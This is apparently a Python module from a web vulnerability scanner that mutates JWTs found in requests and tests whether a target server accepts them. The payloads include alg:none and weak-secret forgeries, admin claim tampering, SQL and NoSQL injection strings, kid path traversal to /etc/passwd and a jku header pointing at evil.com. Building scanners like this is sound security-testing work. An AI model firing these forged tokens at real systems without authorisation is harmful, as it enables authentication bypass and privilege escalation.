"""
JWT Injector — tests JWT token handling vulnerabilities.

Targets JWT values in both headers (Authorization: Bearer ...) and
JSON body fields.  Attacks include algorithm confusion, signature
stripping, claim tampering, structural corruption, and more.
"""

import base64
import hashlib
import hmac
import json
import re
import time as _time
from copy import deepcopy

from injectors.base import BaseInjector
from models.scan_config import VulnerabilityReport

# ── Helpers ────────────────────────────────────────────────────────────

_JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Return (header, payload, signature_part) or raise."""
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError("not a JWT")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def _encode_jwt(header: dict, payload: dict, sig: str = "") -> str:
    """Reassemble a JWT from parts (unsigned or with provided sig)."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{sig}"


def _sign_hs256(header: dict, payload: dict, secret: bytes) -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    msg = f"{h}.{p}".encode()
    sig = _b64url_encode(hmac.new(secret, msg, hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


# ── Payload generation ────────────────────────────────────────────────

def _generate_jwt_payloads(original_token: str) -> list[tuple[str, str]]:
    """
    Given an original JWT, return list of (mutated_token, attack_label).
    """
    results: list[tuple[str, str]] = []

    try:
        header, payload, sig = _decode_jwt(original_token)
    except Exception:
        # Not a valid JWT — still try structural attacks
        return [
            ("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ0ZXN0Ijp0cnVlfQ.", "alg:none static token"),
            ("not.a.jwt", "garbage token"),
            ("", "empty token"),
            ("eyJ0ZXN0IjoiMSJ9", "single-segment token"),
            (original_token + ".extra", "extra segment appended"),
        ]

    orig_payload = deepcopy(payload)

    # ─── 1. Algorithm confusion ─────────────────────────────────

    # alg:none — server should reject unsigned tokens
    none_header = {**header, "alg": "none"}
    results.append((_encode_jwt(none_header, payload, ""), "alg:none (unsigned)"))

    none_header2 = {**header, "alg": "None"}
    results.append((_encode_jwt(none_header2, payload, ""), "alg:None (case variant)"))

    none_header3 = {**header, "alg": "nOnE"}
    results.append((_encode_jwt(none_header3, payload, ""), "alg:nOnE (mixed case)"))

    # alg:HS256 when server might use RS256 (key confusion)
    hs_header = {**header, "alg": "HS256"}
    results.append((_encode_jwt(hs_header, payload, sig), "alg:HS256 (algorithm switch)"))

    # ─── 2. Signature attacks ───────────────────────────────────

    # Empty signature
    parts = original_token.split(".")
    results.append((f"{parts[0]}.{parts[1]}.", "empty signature"))

    # Corrupted signature (flip bits)
    if sig:
        corrupted = sig[:4] + "AAAA" + sig[8:] if len(sig) > 8 else "corrupted"
        results.append((f"{parts[0]}.{parts[1]}.{corrupted}", "corrupted signature"))

    # No signature segment at all
    results.append((f"{parts[0]}.{parts[1]}", "missing signature segment"))

    # Signed with common weak secrets
    for secret in [b"", b"secret", b"password", b"key", b"123456", b"jwt_secret"]:
        label = f"signed with '{secret.decode()}'" if secret else "signed with empty key"
        results.append((_sign_hs256(header, payload, secret), label))

    # ─── 3. Claim tampering ─────────────────────────────────────

    # Elevate role/privilege claims
    role_keys = ["role", "roles", "admin", "is_admin", "isAdmin", "privilege",
                 "permissions", "scope", "group", "groups", "access_level"]
    for rk in role_keys:
        if rk in payload:
            for val in ["admin", "root", "superuser", True, 1]:
                tampered = {**payload, rk: val}
                results.append((_encode_jwt(header, tampered, sig), f"claim {rk}={val}"))

    # Even if not present, try injecting common privilege claims
    for rk in ["role", "admin", "is_admin"]:
        if rk not in payload:
            results.append((_encode_jwt(header, {**payload, rk: "admin"}, sig), f"inject claim {rk}=admin"))

    # Change sub/user identity
    for id_key in ["sub", "id", "user_id", "userId", "email", "user"]:
        if id_key in payload:
            original_val = payload[id_key]
            # Try different user
            if isinstance(original_val, str):
                tampered_vals = [
                    "admin",
                    "admin@admin.com",
                    "1",
                    "0",
                    "",
                    original_val + "x",
                ]
            else:
                tampered_vals = [0, 1, -1, 999999]
            for tv in tampered_vals:
                results.append((_encode_jwt(header, {**payload, id_key: tv}, sig),
                               f"identity {id_key}={tv}"))
            break  # only first identity key

    # Expiration manipulation
    if "exp" in payload:
        # Far future expiry
        far_future = {**payload, "exp": int(_time.time()) + 86400 * 365 * 10}
        results.append((_encode_jwt(header, far_future, sig), "exp: +10 years"))

        # Already expired
        expired = {**payload, "exp": 1000000000}
        results.append((_encode_jwt(header, expired, sig), "exp: year 2001 (expired)"))

        # Remove exp entirely
        no_exp = {k: v for k, v in payload.items() if k != "exp"}
        results.append((_encode_jwt(header, no_exp, sig), "exp: removed"))

    # ─── 4. Injection in claim values ───────────────────────────

    # SQL injection in claims
    for ck in ["sub", "email", "name", "id", "user"]:
        if ck in payload:
            sqli_payload = {**payload, ck: "' OR 1=1--"}
            results.append((_encode_jwt(header, sqli_payload, sig), f"SQLi in claim {ck}"))

            nosqli_payload = {**payload, ck: {"$ne": None}}
            results.append((_encode_jwt(header, nosqli_payload, sig), f"NoSQLi in claim {ck}"))
            break

    # ─── 5. Structural attacks ──────────────────────────────────

    results.append(("", "empty string"))
    results.append(("not.a.jwt", "garbage token"))
    results.append((f"{parts[0]}..", "empty payload segment"))
    results.append((f".{parts[1]}.{sig}", "empty header segment"))
    results.append((original_token + "." + parts[1], "extra segment"))

    # Header injection (typ/kid)
    kid_header = {**header, "kid": "/dev/null"}
    results.append((_encode_jwt(kid_header, payload, sig), "kid: /dev/null"))

    kid_header2 = {**header, "kid": "../../etc/passwd"}
    results.append((_encode_jwt(kid_header2, payload, sig), "kid: path traversal"))

    kid_header3 = {**header, "kid": "'; SELECT 1--"}
    results.append((_encode_jwt(kid_header3, payload, sig), "kid: SQL injection"))

    jku_header = {**header, "jku": "https://evil.com/jwks.json"}
    results.append((_encode_jwt(jku_header, payload, sig), "jku: external JWKS"))

    jwk_header = {**header, "jwk": {"kty": "oct", "k": _b64url_encode(b"secret")}}
    results.append((_encode_jwt(jwk_header, payload, sig), "jwk: embedded key"))

    return results


class JWTInjector(BaseInjector):
    """
    JWT token manipulation injector.

    Unlike other injectors which replace field values with payloads,
    this one finds JWTs in the request (body or headers) and replaces
    them with mutated versions targeting specific JWT weaknesses.
    """

    name = "jwt"
    description = "Tests JWT authentication for algorithm confusion, signature bypass, claim tampering, and structural attacks"

    def generate_payloads(self, context: dict) -> list[str]:
        """
        Not used directly — JWT payloads are generated dynamically
        based on the original token found in each request.
        Returns a placeholder so the base class has something to iterate.
        """
        return ["__jwt_placeholder__"]

    def analyze_response(
        self, baseline: dict, test_response: dict, payload: str,
    ) -> VulnerabilityReport:
        evidence: list[str] = []
        is_vulnerable = False
        confidence = "low"

        test_status = test_response.get("status_code", 0)
        test_body = test_response.get("body", "").lower()
        baseline_status = baseline.get("status_code", 0)
        baseline_body = baseline.get("body", "").lower()
        test_time = test_response.get("response_time_ms", 0)
        baseline_time = baseline.get("response_time_ms", 0)

        # Extract attack label from payload metadata
        attack_label = test_response.get("_attack_label", payload[:60])

        # Application-level rejection: HTTP 200 but body says 401/403 or "invalid token"
        def _app_rejected(body: str) -> bool:
            if not body or not body.strip():
                return False
            lower = body.lower()
            if "invalid jwt" in lower or "invalid token" in lower or "token invalid" in lower:
                return True
            if "unauthorized" in lower or "forbidden" in lower and ("token" in lower or "jwt" in lower or "auth" in lower):
                return True
            try:
                data = json.loads(body)
                code = data.get("code", data.get("status", data.get("statusCode")))
                if code in (401, 403):
                    return True
            except (json.JSONDecodeError, TypeError):
                pass
            return False

        is_success = (200 <= test_status < 300)
        baseline_success = (200 <= baseline_status < 300)
        is_auth_failure = test_status in (401, 403)
        is_app_rejection = _app_rejected(test_response.get("body", ""))
        is_server_error = (test_status >= 500)

        # Token actually accepted = HTTP success AND app did not reject in body
        token_accepted = is_success and baseline_success and not is_auth_failure and not is_app_rejection

        # ── 1. Token accepted when it shouldn't be ──────────────

        if token_accepted:
            # Dangerous attacks that should NEVER be accepted
            critical_attacks = ["alg:none", "alg:None", "alg:nOnE",
                                "empty signature", "missing signature",
                                "corrupted signature", "signed with ''",
                                "empty string", "garbage token"]
            if any(ca in attack_label for ca in critical_attacks):
                evidence.append(f"CRITICAL: Server accepted '{attack_label}' — authentication bypass")
                is_vulnerable = True
                confidence = "high"
            elif "claim" in attack_label or "identity" in attack_label or "inject claim" in attack_label:
                # Check if response actually changed (privilege escalation)
                if test_body != baseline_body:
                    evidence.append(f"Claim tampering '{attack_label}' accepted with different response — possible privilege escalation")
                    is_vulnerable = True
                    confidence = "high"
                else:
                    evidence.append(f"Claim tampering '{attack_label}' accepted (same response — server may not use this claim)")
                    is_vulnerable = True
                    confidence = "low"
            elif "signed with" in attack_label:
                evidence.append(f"Server accepted token '{attack_label}' — weak/known secret key")
                is_vulnerable = True
                confidence = "high"
            elif "exp:" in attack_label:
                if "removed" in attack_label or "expired" in attack_label:
                    evidence.append(f"Server accepted '{attack_label}' — expiration not enforced")
                    is_vulnerable = True
                    confidence = "high"
                elif "+10 years" in attack_label:
                    evidence.append(f"Server accepted far-future expiry — no max lifetime check")
                    is_vulnerable = True
                    confidence = "medium"
            elif "kid:" in attack_label or "jku:" in attack_label or "jwk:" in attack_label:
                evidence.append(f"Server accepted header injection '{attack_label}'")
                is_vulnerable = True
                confidence = "high" if "kid:" in attack_label else "medium"
            elif "SQLi" in attack_label or "NoSQLi" in attack_label:
                evidence.append(f"Injection in claim accepted: '{attack_label}'")
                is_vulnerable = True
                confidence = "medium"

        # ── 2. Server error = potential parsing issue ───────────

        if is_server_error and not (baseline_status >= 500):
            evidence.append(f"Server error ({test_status}) triggered by '{attack_label}' — possible crash/parsing vulnerability")
            is_vulnerable = True
            confidence = "medium"

        # ── 3. Time anomalies ──────────────────────────────────

        if test_time > baseline_time + 2500:
            evidence.append(f"Timing anomaly: {test_time:.0f}ms vs baseline {baseline_time:.0f}ms — possible processing difference")
            if not is_vulnerable:
                is_vulnerable = True
                confidence = "low"

        # ── 4. Proper rejection = good ──────────────────────────

        if not evidence:
            if is_auth_failure:
                evidence.append(f"Properly rejected '{attack_label}' (HTTP {test_status})")
            elif is_app_rejection:
                evidence.append(f"Properly rejected '{attack_label}' (application returned invalid/forbidden in body)")

        return VulnerabilityReport(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            details="; ".join(evidence) if evidence else f"No indicators for '{attack_label}'",
            evidence=evidence,
        )

    # ── Override test_endpoint to handle JWT-specific logic ─────

    async def test_endpoint(
        self,
        url: str,
        method: str = "GET",
        params: dict | None = None,
        headers: dict | None = None,
        body: str = "",
        injection_points: list[str] | None = None,
        target_keys: list[str] | None = None,
        timeout: float = 10.0,
        on_result=None,
        control: dict | None = None,
    ) -> list:
        import asyncio
        import httpx
        from config import SCAN_DEFAULT_TIMEOUT, SCAN_RESPONSE_CAP, PROXY_HOST, PROXY_PORT
        from injectors.base import _DROP_HEADERS, _SCAN_MARKER
        from datetime import datetime, timezone

        params = params or {}
        headers = headers or {}
        injection_points = injection_points or ["body", "headers"]
        ctrl = control or {"signal": "run"}

        # Get baseline
        baseline = await self._send_request(url, method, params, headers, body, timeout)

        # Find all JWTs in the request
        jwt_locations: list[tuple[str, str, str]] = []  # (location_type, key, original_token)

        # Search body for JWTs
        if "body" in injection_points and body:
            try:
                body_data = json.loads(body)
                self._find_jwts_in_dict(body_data, "", jwt_locations, "body")
            except (json.JSONDecodeError, TypeError):
                # Search raw body
                for m in _JWT_RE.finditer(body):
                    jwt_locations.append(("body", "__raw__", m.group()))

        # Search headers for JWTs
        if "headers" in injection_points:
            for hk, hv in headers.items():
                if hk.lower() == "authorization" and "bearer " in hv.lower():
                    token = hv.split(" ", 1)[1].strip()
                    jwt_locations.append(("headers", hk, token))
                elif _JWT_RE.search(str(hv)):
                    jwt_locations.append(("headers", hk, _JWT_RE.search(str(hv)).group()))

        if not jwt_locations:
            # No JWTs found — return empty
            return []

        # Respect target_keys filter
        if target_keys is not None and len(target_keys) == 0:
            return []
        allowed = set(target_keys) if target_keys is not None else None

        # Generate all attack payloads for each JWT location
        all_tests: list[tuple[str, str, str, str, str]] = []  # (loc_type, key, mutated_token, label, original)
        for loc_type, key, original_token in jwt_locations:
            if allowed is not None and key not in allowed:
                continue
            for mutated, label in _generate_jwt_payloads(original_token):
                all_tests.append((loc_type, key, mutated, label, original_token))

        total = len(all_tests)
        results = []
        proxy_url = f"http://{PROXY_HOST}:{PROXY_PORT}"
        idx = 0

        async with httpx.AsyncClient(verify=False, timeout=timeout, proxy=proxy_url) as client:
            for loc_type, key, mutated_token, label, original_token in all_tests:
                # Control signal
                while ctrl.get("signal") == "pause":
                    await asyncio.sleep(0.5)
                if ctrl.get("signal") == "stop":
                    self.results.extend(results)
                    return results

                # Build modified request
                mod_params = dict(params)
                mod_headers = {k: v for k, v in headers.items() if k.lower() not in _DROP_HEADERS}
                mod_headers.update(_SCAN_MARKER)
                mod_body = body

                if loc_type == "body":
                    if key == "__raw__":
                        mod_body = mod_body.replace(original_token, mutated_token)
                    else:
                        try:
                            data = json.loads(mod_body)
                            self._set_jwt_in_dict(data, key, mutated_token)
                            mod_body = json.dumps(data)
                        except Exception:
                            mod_body = mod_body.replace(original_token, mutated_token)
                elif loc_type == "headers":
                    if key.lower() == "authorization":
                        mod_headers[key] = f"Bearer {mutated_token}"
                    else:
                        mod_headers[key] = str(headers.get(key, "")).replace(original_token, mutated_token)

                sent_headers_str = json.dumps(mod_headers, indent=2)
                sent_body = mod_body

                start = _time.time()
                try:
                    if method.upper() == "GET":
                        resp = await client.get(url, params=mod_params, headers=mod_headers)
                    else:
                        resp = await client.request(
                            method, url, params=mod_params, headers=mod_headers,
                            content=mod_body.encode("utf-8") if mod_body else b"",
                        )
                    elapsed = round((_time.time() - start) * 1000, 2)
                    resp_body = resp.text[:SCAN_RESPONSE_CAP]

                    report = self.analyze_response(
                        baseline,
                        {
                            "status_code": resp.status_code,
                            "body": resp_body,
                            "response_time_ms": elapsed,
                            "headers": dict(resp.headers),
                            "_attack_label": label,
                        },
                        label,
                    )

                    from models.scan_config import ScanResult
                    result = ScanResult(
                        timestamp=datetime.now(timezone.utc).isoformat(),
                        target_url=url,
                        injector_type=self.name,
                        payload=f"[{label}] {mutated_token[:80]}..." if len(mutated_token) > 80 else f"[{label}] {mutated_token}",
                        injection_point=loc_type,
                        original_param=key,
                        response_code=resp.status_code,
                        response_body=resp_body,
                        response_time_ms=elapsed,
                        request_headers=sent_headers_str,
                        request_body=sent_body,
                        is_vulnerable=report.is_vulnerable,
                        confidence=report.confidence,
                        details=report.details,
                    )
                except Exception as e:
                    from models.scan_config import ScanResult
                    elapsed = round((_time.time() - start) * 1000, 2)
                    result = ScanResult(
                        timestamp=datetime.now(timezone.utc).isoformat(),
                        target_url=url,
                        injector_type=self.name,
                        payload=f"[{label}]",
                        injection_point=loc_type,
                        original_param=key,
                        response_code=0,
                        response_body=str(e),
                        request_headers=sent_headers_str,
                        request_body=sent_body,
                        is_vulnerable=False,
                        confidence="low",
                        details=f"Request failed: {e}",
                    )

                results.append(result)
                idx += 1
                if on_result:
                    await on_result(result, idx, total)

        self.results.extend(results)
        return results

    def _find_jwts_in_dict(self, obj, prefix: str, out: list, loc_type: str):
        """Recursively find JWT values in a dict."""
        if isinstance(obj, dict):
            for k, v in obj.items():
                path = f"{prefix}.{k}" if prefix else k
                if isinstance(v, str) and _JWT_RE.match(v):
                    out.append((loc_type, path, v))
                elif isinstance(v, dict):
                    self._find_jwts_in_dict(v, path, out, loc_type)

    def _set_jwt_in_dict(self, obj: dict, dotpath: str, value: str):
        """Set a value in nested dict by dot-path."""
        parts = dotpath.split(".")
        current = obj
        for part in parts[:-1]:
            if isinstance(current, dict) and part in current:
                current = current[part]
            else:
                return
        if isinstance(current, dict):
            current[parts[-1]] = value
